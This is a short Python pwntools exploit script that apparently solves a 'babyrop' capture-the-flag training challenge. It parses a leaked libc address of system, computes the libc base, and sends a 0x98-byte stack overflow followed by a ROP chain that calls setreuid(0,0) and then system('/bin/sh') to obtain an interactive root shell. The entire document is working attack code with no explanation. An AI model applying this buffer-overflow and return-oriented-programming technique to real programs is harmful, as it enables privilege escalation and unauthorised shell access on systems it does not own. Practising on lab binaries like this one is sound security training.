from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babyrop_level7.0", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyrop_level7.1")
buf = b"A" * (0x98)
p.recvuntil(b"in libc is: ")
leak = int(p.recvuntil(b".")[:-1], 16)

context.arch = 'amd64'
libc = ELF(p.libc.path)
system_function_in_libc_offset = libc.symbols['system']
libc.address = leak - system_function_in_libc_offset

rop = ROP(libc)
pop_rdi = rop.rdi.address
pop_rdx = rop.rdx_r12.address
syscall = rop.syscall.address
s_a = next(libc.search(b"/bin/sh\x00"))

rop.setreuid(0,0)

rop.raw(pop_rdi)
rop.raw(s_a)
rop.raw(leak)

payload = buf + rop.chain()

p.send(payload)
p.interactive()
